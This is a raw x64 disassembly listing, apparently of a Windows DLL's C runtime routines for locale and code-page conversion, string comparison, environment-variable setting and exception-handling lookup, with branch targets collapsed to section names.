add rsp 0x28
retn
cmp rcx 0xfffffffffffffffe
je r-xdata
call [ CloseHandle@IAT ]
call [ CloseHandle@IAT ]
sub_180012ba4
sub rsp 0x38
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x28 ] rax
lea r8 [ rsp + 0x20 ]
mov r9d 0x6
mov edx 0x1004
mov [ rsp + 0x26 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea rcx [ rsp + 0x20 ]
call sub_180006268
or eax 0xffffffff
jmp r-xdata
mov rcx [ rsp + 0x28 ]
xor rcx rsp
call sub_1800042d0
add rsp 0x38
retn
sub_180012bf8
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x88
lea rbp [ rsp + 0x40 ]
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x30 ] rax
mov r14 [ rbp + 0xb0 ]
mov r12d [ r9 ]
xor edi edi
mov rbx r8
mov rsi rdi
mov [ rbp ] edi
mov [ rbp + 0x10 ] r9
mov r13d edx
mov r15d ecx
mov [ rbp + 0x8 ] rbx
cmp ecx edx
je r-xdata
mov rax rsi
lea rdx [ rbp + 0x18 ]
call [ GetCPInfo@IAT ]
cmp eax edi
je r-xdata
mov r9d r12d
mov r8 rbx
mov edx 0x1
mov ecx r15d
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
mov edi eax
test eax eax
jne r-xdata
cmp [ rbp + 0x18 ] 0x1
jne r-xdata
test edi edi
jle r-xdata
xor eax eax
jmp r-xdata
lea rdx [ rbp + 0x18 ]
mov ecx r13d
call [ GetCPInfo@IAT ]
cmp eax edi
je r-xdata
xor ebx ebx
movsxd rcx edi
mov rax 0x7ffffffffffffff0
cmp rcx rax
ja r-xdata
mov rcx [ rbp + 0x30 ]
xor rcx rbp
call sub_1800042d0
lea rsp [ rbp + 0x48 ]
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
cmp [ rbp + 0x18 ] 0x1
jne r-xdata
movsxd r8 edi
xor edx edx
mov rcx rbx
add r8 r8
call sub_180009540
mov r8 [ rbp + 0x8 ]
mov r9d r12d
mov edx 0x1
mov ecx r15d
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
xor r15d r15d
cmp eax r15d
je r-xdata
lea rcx [ rcx + rcx + 0x10 ]
cmp rcx 0x400
ja r-xdata
mov [ rbp ] 0x1
cmp r12d 0xffffffff
je r-xdata
lea rcx [ rbx - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
cmp r14 r15
je r-xdata
call sub_180004454
mov rbx rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
mov rcx rbx
call sub_18000d180
lea edi [ rax + 0x1 ]
jmp r-xdata
mov edi r12d
call sub_180004690
cmp [ rbp ] r15d
jne r-xdata
mov eax [ rbp + 0xb8 ]
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] r15
mov [ rsp + 0x28 ] eax
mov r9d edi
mov r8 rbx
xor edx edx
mov ecx r13d
mov [ rsp + 0x20 ] r14
call [ WideCharToMultiByte@IAT ]
cmp eax r15d
je r-xdata
test rbx rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180015990
sub rsp rax
lea rbx [ rsp + 0x40 ]
test rbx rbx
je r-xdata
mov rax 0xffffffffffffff0
movsxd rdx edi
mov ecx 0x1
call sub_180006b3c
mov rsi rax
cmp rax r15
je r-xdata
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] r15
mov r9d edi
mov r8 rbx
xor edx edx
mov ecx r13d
mov [ rsp + 0x28 ] r15d
mov [ rsp + 0x20 ] r15
call [ WideCharToMultiByte@IAT ]
mov edi eax
cmp eax r15d
je r-xdata
mov rsi r14
jmp r-xdata
mov [ rbx ] 0xcccc
jmp r-xdata
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] r15
mov r9d edi
mov r8 rbx
xor edx edx
mov ecx r13d
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
cmp eax r15d
jne r-xdata
add rbx 0x10
jmp r-xdata
cmp r12d 0xffffffff
je r-xdata
mov rcx rsi
call sub_180004690
mov rsi r15
jmp r-xdata
mov rcx [ rbp + 0x10 ]
mov [ rcx ] eax
sub_180012e80
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
sub rsp 0x60
mov rsi rcx
mov rdi rdx
lea rcx [ rax - 0x28 ]
mov rdx r9
mov rbp r9
mov rbx r8
call sub_180005710
test rbx rbx
jne r-xdata
test rsi rsi
jne r-xdata
cmp [ rsp + 0x58 ] bl
je r-xdata
test rdi rdi
je r-xdata
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp rbx 0x7fffffff
ja r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x48 ]
cmp [ rcx + 0x8 ] 0x0
jne r-xdata
mov eax [ rcx + 0x4 ]
mov edx [ rcx + 0xc ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] ebx
mov r9 rsi
mov r8d 0x1001
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x20 ] ebx
call sub_180013568
test eax eax
je r-xdata
mov r9 rbp
mov r8 rbx
mov rdx rdi
mov rcx rsi
call sub_1800135f4
jmp r-xdata
cmp [ rsp + 0x58 ] 0x0
je r-xdata
add eax 0xfffffffe
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_180012f98
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0x40
and [ rsp + 0x50 ] 0x0
mov rbx [ rw-data ]
mov rax [ rbx ]
test rax rax
je r-xdata
xor eax eax
or ebp 0xffffffff
mov eax ebp
jmp r-xdata
mov rcx rdi
mov edx 0x1
call sub_180006b3c
mov [ rsp + 0x50 ] rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rbp [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
mov r8 [ rbx ]
mov r9d ebp
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov rcx [ rsp + 0x50 ]
call sub_180004690
lea rcx [ rsp + 0x50 ]
xor edx edx
call sub_18001370c
test eax eax
jns r-xdata
add rbx 0x8
mov rax [ rbx ]
test rax rax
jne r-xdata
mov rcx [ rsp + 0x50 ]
test rcx rcx
je r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
mov r9d ebp
mov r8 rax
xor edx edx
xor ecx ecx
call [ WideCharToMultiByte@IAT ]
movsxd rdi eax
test eax eax
je r-xdata
call sub_180004690
and [ rsp + 0x50 ] 0x0
sub_18001308c
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x68
lea rbp [ rsp + 0x30 ]
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x28 ] rax
mov rdi [ rbp + 0xa8 ]
mov r10d edx
mov [ rbp ] edx
mov edx [ rw-data ]
mov r11d 0x2
xor ebx ebx
mov r15 r9
mov [ rbp + 0x4 ] r8d
mov r14 rcx
mov [ rbp + 0x8 ] rdi
lea r12d [ r11 - 0x1 ]
cmp edx ebx
jne r-xdata
mov r9d [ rbp + 0xa0 ]
cmp r9d ebx
jle r-xdata
lea r8 [ r--data ]
mov r9d r12d
xor edx edx
xor ecx ecx
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] r8
call [ CompareStringW@IAT ]
cmp eax ebx
je r-xdata
or esi 0xffffffff
cmp r9d esi
jge r-xdata
mov ecx r9d
mov rax r15
call [ GetLastError@IAT ]
mov edx [ rw-data ]
mov r11d 0x2
cmp eax 0x78
cmove edx r11d
mov edx r12d
lea r11d [ r12 + 0x1 ]
jmp r-xdata
mov r8d [ rbp + 0xb0 ]
cmp r8d ebx
jle r-xdata
xor eax eax
jmp r-xdata
mov eax esi
sub eax ecx
add r9d eax
mov [ rbp + 0xa0 ] r9d
add rax r12
cmp ecx ebx
jne r-xdata
mov r10d [ rbp ]
mov [ rw-data ] edx
cmp r8d esi
jl r-xdata
mov ecx r8d
mov rax rdi
mov rcx [ rbp + 0x28 ]
xor rcx rbp
call sub_1800042d0
lea rsp [ rbp + 0x38 ]
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
sub ecx r12d
or esi 0xffffffff
cmp [ rax ] bl
je r-xdata
mov ecx esi
cmp edx r11d
je r-xdata
mov eax esi
sub eax ecx
add r8d eax
mov [ rbp + 0xb0 ] r8d
jmp r-xdata
add rax r12
cmp ecx ebx
jne r-xdata
mov rdi rbx
mov r13 rbx
cmp r10d ebx
jne r-xdata
cmp edx ebx
je r-xdata
sub ecx r12d
cmp [ rax ] bl
je r-xdata
mov ecx esi
mov r12d [ rbp + 0xb8 ]
cmp r12d ebx
jne r-xdata
mov rax [ r14 ]
mov r10d [ rax + 0x14 ]
mov [ rbp ] r10d
cmp edx r12d
jne r-xdata
mov ecx r10d
call sub_180012ba4
mov r14d eax
cmp eax esi
je r-xdata
mov rax [ r14 ]
mov r12d [ rax + 0x4 ]
mov r13d [ rbp + 0xb8 ]
cmp r13d ebx
jne r-xdata
cmp eax r12d
je r-xdata
cmp r9d ebx
je r-xdata
mov rcx [ r14 ]
mov r13d [ rcx + 0x4 ]
mov r8 [ rbp + 0x8 ]
lea r9 [ rbp + 0xa0 ]
mov r8 r15
mov edx eax
mov ecx r12d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call sub_180012bf8
mov rdi rax
cmp rax rbx
je r-xdata
cmp r9d r8d
jne r-xdata
cmp r8d ebx
jne r-xdata
mov eax esi
mov rcx rdi
call sub_180004690
mov rcx r13
call sub_180004690
mov r8 [ rbp + 0x8 ]
lea r9 [ rbp + 0xb0 ]
mov edx r14d
mov ecx r12d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call sub_180012bf8
mov r13 rax
cmp rax rbx
jne r-xdata
cmp r8d r12d
jle r-xdata
mov eax r11d
jmp r-xdata
mov r8 r15
mov edx 0x9
mov ecx r13d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
movsxd r14 eax
cmp r14d ebx
je r-xdata
mov r15 rdi
mov r8 rax
jmp r-xdata
mov rcx rdi
call sub_180004690
jmp r-xdata
cmp r9d r12d
jle r-xdata
mov eax r12d
jmp r-xdata
mov r8 0xffffffffffffff0
jle r-xdata
mov eax [ rbp + 0xb0 ]
mov r9d [ rbp + 0xa0 ]
mov edx [ rbp + 0x4 ]
mov ecx [ rbp ]
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] r8
mov r8 r15
call [ CompareStringA@IAT ]
mov esi eax
cmp rdi rbx
je r-xdata
lea rdx [ rbp + 0x10 ]
mov ecx r13d
call [ GetCPInfo@IAT ]
cmp eax ebx
je r-xdata
mov eax 0x3
jmp r-xdata
mov rsi rbx
xor edx edx
lea rax [ rdx - 0x20 ]
div r14
cmp rax 0x2
jb r-xdata
mov r9d [ rbp + 0xa0 ]
cmp r9d ebx
jle r-xdata
mov r9d [ rbp + 0xa0 ]
mov r8 r15
mov edx r12d
mov ecx r13d
mov [ rsp + 0x28 ] r14d
mov [ rsp + 0x20 ] rsi
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
lea rcx [ r14 + r14 + 0x10 ]
cmp rcx 0x400
ja r-xdata
cmp [ rbp + 0xb0 ] ebx
jle r-xdata
cmp [ rbp + 0x10 ] 0x2
jb r-xdata
lea rcx [ rsi - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r9d [ rbp + 0xb0 ]
mov r8 rdi
mov edx 0x9
mov ecx r13d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
movsxd r12 eax
cmp r12d ebx
je r-xdata
call sub_180004454
mov rsi rax
cmp rax rbx
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
cmp [ rbp + 0x10 ] 0x2
jb r-xdata
cmp [ rbp + 0x16 ] bl
lea rax [ rbp + 0x16 ]
mov eax ebx
jmp r-xdata
call sub_180004690
jle r-xdata
cmp rsi rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180015990
sub rsp rax
lea rsi [ rsp + 0x30 ]
cmp rsi rbx
je r-xdata
mov rax r8
cmp [ rbp + 0x16 ] bl
lea rax [ rbp + 0x16 ]
cmp [ rax + 0x1 ] bl
je r-xdata
mov rdi rbx
xor edx edx
lea rax [ rdx - 0x20 ]
div r12
cmp rax 0x2
jb r-xdata
mov [ rsi ] 0xcccc
jmp r-xdata
cmp [ rax + 0x1 ] bl
je r-xdata
mov cl [ r15 ]
cmp cl [ rax ]
jb r-xdata
mov r9d [ rbp + 0xb0 ]
mov r8 [ rbp + 0x8 ]
mov edx 0x1
mov ecx r13d
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
lea rcx [ r12 + r12 + 0x10 ]
cmp rcx 0x400
ja r-xdata
add rsi 0x10
jmp r-xdata
mov cl [ rdi ]
cmp cl [ rax ]
jb r-xdata
add rax 0x2
cmp [ rax ] bl
jmp r-xdata
cmp cl [ rax + 0x1 ]
jbe r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov edx [ rbp + 0x4 ]
mov ecx [ rbp ]
mov r9d r14d
mov r8 rsi
mov [ rsp + 0x28 ] r12d
mov [ rsp + 0x20 ] rdi
call [ CompareStringW@IAT ]
mov ebx eax
call sub_180004454
mov rdi rax
cmp rax rbx
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
add rax 0x2
cmp [ rax ] bl
jmp r-xdata
cmp cl [ rax + 0x1 ]
jbe r-xdata
je r-xdata
mov eax 0x2
jmp r-xdata
call sub_180004690
cmp rdi rbx
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_180015990
sub rsp rax
lea rdi [ rsp + 0x30 ]
cmp rdi rbx
je r-xdata
mov rax 0xffffffffffffff0
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
add rdi 0x10
jmp r-xdata
sub_180013568
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x60
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x40 ]
mov rbx r9
mov edi r8d
call sub_180005710
mov r11d [ rsp + 0xa8 ]
mov eax [ rsp + 0xa0 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x38 ] r11d
mov [ rsp + 0x30 ] eax
mov rax [ rsp + 0x98 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x90 ]
mov r9 rbx
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_18001308c
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_1800135f4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x60
mov rsi rcx
mov rdi rdx
lea rcx [ rsp + 0x40 ]
mov rdx r9
mov rbx r8
call sub_180005710
test rbx rbx
jne r-xdata
test rsi rsi
jne r-xdata
cmp [ rsp + 0x58 ] bl
je r-xdata
test rdi rdi
je r-xdata
call sub_1800075a8
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180008530
xor eax eax
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp rbx 0x7fffffff
ja r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rsp + 0x50 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
mov rax [ rsp + 0x40 ]
mov edx [ rax + 0x10 ]
test edx edx
jne r-xdata
mov eax [ rax + 0x8 ]
lea rcx [ rsp + 0x40 ]
mov r9 rsi
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] ebx
mov r8d 0x1001
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x20 ] ebx
call sub_180013568
test eax eax
jne r-xdata
lea r9 [ rsp + 0x40 ]
mov r8 rbx
mov rdx rdi
mov rcx rsi
call sub_180005894
jmp r-xdata
add eax 0xfffffffe
call sub_1800075a8
mov [ rax ] 0x16
jmp r-xdata
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x58 ] 0x0
je r-xdata
sub_18001370c
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x10 ] edx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
xor r13d r13d
mov ebp edx
mov r14 rcx
mov ebx r13d
cmp rcx r13
jne r-xdata
mov r12 [ rcx ]
cmp r12 r13
je r-xdata
call sub_1800075a8
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
mov [ rax ] 0x16
call sub_180008530
jmp r-xdata
call sub_1800075a8
mov [ rax ] 0x16
mov edx 0x3d
mov rcx r12
call sub_180013c24
mov rdi rax
mov [ rsp + 0x70 ] rax
cmp rax r13
je r-xdata
or eax 0xffffffff
cmp r12 rax
je r-xdata
cmp [ rax + 0x1 ] r13b
mov rsi [ rw-data ]
mov r15d r13d
sete r15b
cmp rsi [ rw-data ]
jne r-xdata
cmp rsi r13
jne r-xdata
mov rbp rsi
mov eax r13d
cmp rsi r13
jne r-xdata
mov rbp rsi
cmp rsi r13
je r-xdata
cmp ebp r13d
je r-xdata
cmp [ rsi ] r13
jne r-xdata
mov rsi r13
jmp r-xdata
mov rcx [ rsi ]
mov eax edi
mov rdi rsi
sub eax r12d
movsxd r13 eax
test rcx rcx
je r-xdata
cmp r15d r13d
je r-xdata
cmp [ rw-data ] r13
je r-xdata
add rsi 0x8
inc eax
inc eax
mov edx 0x8
movsxd rcx eax
call sub_180006b3c
mov rdi rax
mov rsi rax
cmp rax r13
jne r-xdata
mov ebp [ rsp + 0x78 ]
mov [ rw-data ] rsi
sub rdi rsi
sar rdi 0x3
neg edi
mov rdx rcx
mov r8 r13
mov rcx r12
call sub_180012f90
test eax eax
jne r-xdata
mov ecx 0x8
call sub_180006ad0
mov [ rw-data ] rax
cmp rax r13
je r-xdata
xor eax eax
jmp r-xdata
call sub_180012f98
cmp eax r13d
je r-xdata
mov rax [ rbp ]
cmp rax r13
jne r-xdata
mov ecx 0x9
call sub_180006d18
jmp r-xdata
cmp r15d r13d
jne r-xdata
cmp [ rbp ] r13
je r-xdata
add rdi 0x8
mov rcx [ rdi ]
test rcx rcx
jne r-xdata
mov rax [ rdi ]
cmp [ r13 + rax ] 0x3d
je r-xdata
mov [ rax ] r13
cmp [ rw-data ] r13
jne r-xdata
mov rbx [ rsp + 0x80 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rsi [ rw-data ]
mov rcx rax
call sub_180013abc
mov [ rdi ] rax
add rdi 0x8
add rbp 0x8
mov [ rdi ] r13
mov rdi [ rsp + 0x70 ]
mov rcx r12
call sub_180004690
mov [ r14 ] r13
jmp r-xdata
cmp edi r13d
jge r-xdata
movsxd rsi edi
mov rcx [ rbp + rsi * 8 ]
call sub_180004690
cmp r15d r13d
je r-xdata
mov rsi [ rw-data ]
mov rsi [ rw-data ]
sub rdi rsi
sar rdi 0x3
jmp r-xdata
cmp [ r13 + rax ] bl
je r-xdata
mov ecx 0x8
call sub_180006ad0
mov [ rw-data ] rax
cmp rax r13
je r-xdata
lea eax [ rdi + 0x2 ]
cmp eax edi
jl r-xdata
neg edi
mov [ rbp + rsi * 8 ] r12
mov [ r14 ] r13
jmp r-xdata
cmp [ rbp + rsi * 8 ] r13
je r-xdata
xor r13d r13d
cmp edi r13d
jl r-xdata
mov [ rax ] r13
movsxd r8 eax
mov rax 0x1fffffffffffffff
cmp r8 rax
jae r-xdata
cmp [ rsp + 0x78 ] r13d
je r-xdata
movsxd rdx edi
mov rax 0x1fffffffffffffff
cmp rdx rax
jae r-xdata
lea rcx [ rbp + rsi * 8 + 0x8 ]
mov edx 0x8
mov rcx rsi
call sub_180006c48
cmp rax r13
je r-xdata
cmp r15d r13d
je r-xdata
mov rcx r12
call sub_18000d180
mov edx 0x1
lea rcx [ rax + 0x2 ]
call sub_180006b3c
mov rdi rax
cmp rax r13
je r-xdata
mov rcx [ rw-data ]
mov r8d 0x8
call sub_180006c48
cmp rax r13
je r-xdata
mov rax [ rcx ]
inc edi
add rcx 0x8
mov [ rbp + rsi * 8 ] rax
inc rsi
cmp [ rbp + rsi * 8 ] r13
jne r-xdata
movsxd rcx edi
mov [ rax + rcx * 8 ] r12
mov [ rax + rcx * 8 + 0x8 ] r13
mov [ r14 ] r13
mov eax ebx
jmp r-xdata
mov rcx r12
call sub_180004690
mov [ r14 ] r13
mov rcx r12
call sub_18000d180
mov r8 r12
mov rcx rdi
lea rdx [ rax + 0x2 ]
call sub_18000f628
cmp eax r13d
je r-xdata
jmp r-xdata
mov rdx rdi
mov rcx rdi
sub rdx r12
add rdx [ rsp + 0x70 ]
mov [ rdx ] r13b
inc rdx
cmp r15d r13d
cmovne rdx r13
call [ SetEnvironmentVariableA@IAT ]
cmp eax r13d
jne r-xdata
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] r13
call sub_180008408
mov [ rw-data ] rax
mov rcx rdi
call sub_180004690
or ebx 0xffffffff
call sub_1800075a8
mov [ rax ] 0x2a
sub_180013abc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x30
mov rbx rcx
test rcx rcx
je r-xdata
xor eax eax
call sub_18000d180
mov rsi rax
lea rcx [ rax + 0x1 ]
call sub_180004454
mov rdi rax
test rax rax
je r-xdata
lea rdx [ rsi + 0x1 ]
mov r8 rbx
mov rcx rax
call sub_18000f628
test eax eax
je r-xdata
mov rax rdi
jmp r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008408
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
add rsp 0x30
pop rdi
retn
sub_180013b2c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x50
mov rbx rcx
mov edi edx
lea rcx [ rsp + 0x30 ]
mov rdx r8
call sub_180005710
xor esi esi
cmp rbx rsi
jne r-xdata
mov rdx [ rsp + 0x38 ]
cmp [ rdx + 0x8 ] esi
jne r-xdata
call sub_1800075a8
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rsi
mov [ rax ] 0x16
call sub_180008530
movzx ecx [ rbx ]
cmp cx si
je r-xdata
mov edx edi
mov rcx rbx
call sub_180013c2c
xor eax eax
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
movzx eax cx
cmp edi eax
jne r-xdata
movzx eax cl
test [ rax + rdx + 0x1d ] 0x4
je r-xdata
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
cmp [ rsp + 0x48 ] sil
je r-xdata
cmp [ rsp + 0x48 ] sil
je r-xdata
movzx eax cx
cmp edi eax
je r-xdata
inc rbx
cmp [ rbx ] sil
je r-xdata
mov rax rbx
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
inc rbx
jmp r-xdata
movzx eax [ rbx ]
movzx ecx cx
shl ecx 0x8
or ecx eax
cmp edi ecx
jne r-xdata
lea rax [ rbx - 0x1 ]
jmp r-xdata
cmp [ rsp + 0x48 ] sil
je r-xdata
sub_180013c2c
jmp r-xdata
mov al [ rcx ]
test al al
jne r-xdata
cmp al dl
je r-xdata
cmp al dl
jne r-xdata
mov rax rcx
retn
inc rcx
xor eax eax
retn
sub_180013c60
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov r10 [ r9 + 0x38 ]
mov rsi rdx
mov r12 r8
mov eax [ r10 ]
mov rbp rcx
mov rdx r9
add rax rax
mov rcx rsi
mov rdi r9
lea rbx [ r10 + rax * 8 + 0x4 ]
mov r8 rbx
call sub_180009a8c
mov r11d [ rbx ]
mov r10d [ rbp + 0x4 ]
mov eax r11d
and r11d 0x2
mov edx 0x1
and eax edx
and r10b 0x66
cmove r11d eax
test r11d r11d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov eax edx
add rsp 0x20
pop r12
retn
mov r9 rdi
mov r8 r12
mov rdx rsi
mov rcx rbp
call sub_1800070e4
mov edx eax
sub_180013cf4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov rbx [ r9 + 0x38 ]
mov rsi rdx
mov r12 r8
mov rbp rcx
lea r8 [ rbx + 0x4 ]
mov rdx r9
mov rcx rsi
mov rdi r9
call sub_180009a8c
mov r11d [ rbx + 0x4 ]
mov r10d [ rbp + 0x4 ]
mov eax r11d
and r11d 0x2
mov r8d 0x1
and eax r8d
and r10b 0x66
cmove r11d eax
test r11d r11d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
mov eax r8d
add rsp 0x20
pop r12
retn
mov r9 rdi
mov r8 r12
mov rdx rsi
mov rcx rbp
call sub_180013f84
mov r8d eax
sub_180013d84
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
movsxd rdi [ r8 + 0xc ]
mov r15 rcx
mov rcx r8
mov rbp r9
mov r13 r8
mov r14 rdx
call sub_180014478
mov r10 [ r15 ]
mov [ rbp ] r10
mov r12d eax
test edi edi
je r-xdata
mov rbx [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
mov rax rbp
mov rbp [ rsp + 0x60 ]
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
lea rcx [ rdi + rdi * 4 ]
lea rsi [ rcx * 4 - 0x14 ]
sub rsi 0x14
add edi 0xffffffff
je r-xdata
cmp r12d [ rbx + 0x8 ]
jg r-xdata
jmp r-xdata
mov rcx [ r14 ]
lea rdx [ rsp + 0x50 ]
xor r8d r8d
call RtlLookupFunctionEntry
movsxd r8 [ rbx + 0x10 ]
mov r9d [ rbx + 0xc ]
add r8 [ rsp + 0x50 ]
mov r10d [ rax ]
xor ecx ecx
test r9d r9d
je r-xdata
movsxd rbx [ r13 + 0x10 ]
add rbx [ r14 + 0x8 ]
add rbx rsi
cmp r12d [ rbx + 0x4 ]
jle r-xdata
cmp ecx r9d
jb r-xdata
lea rdx [ r8 + 0xc ]
mov rax [ r15 ]
lea rcx [ rcx + rcx * 4 ]
movsxd rcx [ r8 + rcx * 4 + 0x10 ]
mov rcx [ rcx + rax ]
mov [ rbp ] rcx
inc ecx
add rdx 0x14
cmp ecx r9d
jb r-xdata
movsxd rax [ rdx ]
cmp rax r10
je r-xdata
sub_180013ed8
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
lea r9 [ rax + 0x18 ]
mov rbp r8
mov r12 rdx
call sub_180013d84
mov rdx r12
mov rcx rbp
mov r13 rax
call sub_180014478
movsxd rdi [ rbp + 0xc ]
mov esi eax
test edi edi
je r-xdata
xor edx edx
lea rcx [ rdi + rdi * 4 ]
